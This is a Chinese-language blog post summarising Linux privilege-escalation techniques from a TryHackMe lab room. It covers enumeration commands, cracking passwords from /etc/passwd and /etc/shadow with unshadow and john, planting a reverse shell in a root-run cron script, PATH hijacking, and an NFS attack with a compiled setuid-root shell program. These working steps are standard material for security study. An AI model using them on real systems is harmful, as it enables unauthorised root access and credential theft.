---
layout: post
title:  "Linux Privilege Escalation"
date:   26 June 2025
categories: Demo
tags: Cybersecurity
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
今天來迅速了解關於Linux提權的常用手法，可能會有些簡陋，主要是提供自己一個思路。在真正提權時根據這個思路來走才不會忙手忙腳

介紹的手法出自 [TryHackMe - Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)，有興趣的朋友可以自行查閱，後續若有看到新的手法會再進行補充

***提權手法:***
1. [Kernel Exploit](#1-kernel-exploit)
2. [Sudo -l](#2-sudo--l)
3. [SUID](#3-suid)
4. [Capabilities](#4-capabilities)
5. [Cron Jobs](#5-cron-jobs)
6. [PATH](#6-path)
7. [NFS](#7-nfs)

### 1. Kernel Exploit
有些Linux版本內核會有漏洞可以利用來提權，這部分可以在最剛開始拿到權限時就進行測試，因為不需要跑什麼腳本，可以通過簡單的查詢來快速排除/利用此項提權手法:

```bash
hostname
uname -a
cat /proc/version
cat /etc/issue
```

查到內核版本後上網查這個版本是否有CVE漏洞可以用來提權，注意這邊版本必需要直接對應，以及使用漏洞前要先徹底了解腳本會帶來的影響，因為這類型的腳本通常有可能造成系統crash

### 2. sudo -l
快速查閱當前用戶有沒有被授予對特定程序的sudo權限，如果有可利用 [GTFOBins](https://gtfobins.github.io/#) 查實際的提權手法

通常來說提權後關注的文件有:
- `/etc/passwd`
- `/etc/shadow`

獲得這兩個文件後可利用 **unshadow + john** 來破解用戶密碼:

```bash
#有兩個文件分別對應/etc/shadow & /etc/passwd
unshadow password.txt shadow.txt > unshadow.txt
john unshadow.txt
```

### 3. SUID
通過 **find** 指令查詢所有設置SUID的程序，進一步利用 [GTFOBins](https://gtfobins.github.io/#) 查實際提權手法

```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -4000 -user root 2>/dev/null
```

順帶一提，可以利用 **id** 來查自己或別的用戶的權限以及所在群組，非常有用:

```bash
id
id jerry
```

### 4. Capabilities
*Capability 是 Linux 內核從 2.2 起引入的權限模型，可以讓某些程式在不設 SUID 的情況下擁有特權操作*

因此，如果用 `find` 查詢 SUID 的話是查不出 capability 的，因為它們所在的層面不同，雖然同樣屬於access control。要查詢Capability可以用 **getcap** 來查:

```bash
getcap -r / 2>/dev/null
```

若有查到類似 **cap_setuid+ep** 之類的就表示可能可以利用，因為還要在用 `ls` 檢查 owner 是否為 root 才能利用。當然這一步也可以在使用 **linpeas** 的時候就看到結果，只不過要自己去翻就是了 :D

### 5. Cron jobs
Linux的自動排程程序也可以作為提權手段，思路就是如果有排程任務它的擁有者是root，並且我們擁有這個排程任務執行的script的寫的權限，那麼我們就可以做提權

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

- 例如像上面這個crontab，我們可以先找一下有沒有antivirus.sh，發現好像沒有這個文件，那麼我們正常來說可以創造一個名為 antivirus.sh 的文件並放在 PATH 下，但是當我們檢查這麼多個PATH之後發現當前用戶都沒有寫入權限，因此pass
- 再來我們去檢查 /home/karen/backup.sh 我們有無寫入權限，也是沒有因此pass
- 最後看到/tmp/test.py，對/tmp目錄我們有寫入權限，因此創建一個bash file名為test.py，內容是一個reverse shell返回到我們攻擊主機
- 注意這個test.py實際上並不是python file而是bash file，因為python file的話需要在裡面進一步設置setuid(0)之類的，而我們自己創造的test.py實際上並沒有權限可以這麼做，因此直接利用bash file執行reverse shell即可

### 6. PATH
利用的就是有些程序調用時使用例如 `os.system("vim")`也就是沒有使用絕對路徑，這樣的話linux會默認到環境變數PATH下依照順序到各個目錄下看有沒有這麼一個程序名為 `vim`。但如果下面條件有任何一項符合的話我們就可以利用環境變數PATH來提權:
- PATH中有哪些folder並且有folder我們有寫入權限
- 當前用戶有無權限修改PATH

**所以我們可以簡化出一個流程用於檢查是否可以利用PATH提權**：
- PATH中有哪些folder
- (二擇一)這些folder有沒有w權限
- (二擇一)可不可以修改PATH
- 有沒有script/application可以利用的(也就是有使用相對路徑調用的)

**常用指令:**

```bash
# 查看PATH
echo $PATH
# 查哪些folder當前用戶有寫入(w)權限
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
# 修改PATH
export PATH=/tmp:$PATH
```

### 7. NFS
NFS (Network File Sharing)也可以用來提權，思路就是在攻擊主機中mount到受害者主機分享的資料夾，之後用root用戶創建一個executable並且設置SUID，這樣在受害者主機上也會是root權限和SUID:
- 查看NFS 
  
```bash
# victim's perspective
cat /etc/exports
```

- 攻擊者主機:找出NFS並且mount到shared folder 
  
```bash
# attacker's perspective
showmount -e <VICTIM_IP>    #找出shared folders
mkdir /tmp/ttmp
mount -o rw <VICTIM_IP>:<SHARED_FOLDER> /tmp/ttmp   #mount到攻擊者主機文件夾
```
  
- 建一個ELF executable並且權限為owner:root和SUID

```c
#include <unistd.h>
#include <stdlib.h>

int main(){
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

- 編譯為ELF executable

```bash
gcc nfs.c -o nfs -w
chmod +s nfs
```

- 最後在reverse shell上執行

```bash
./nfs
```

### 自我總結
提權手法類別:
- kernel exploit
- sudo -l
- SUID
- capability
- cron jobs
- PATH
- NFS

## 學習資料
1. [TryHackMe - Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)

</div>
</body>
</html>
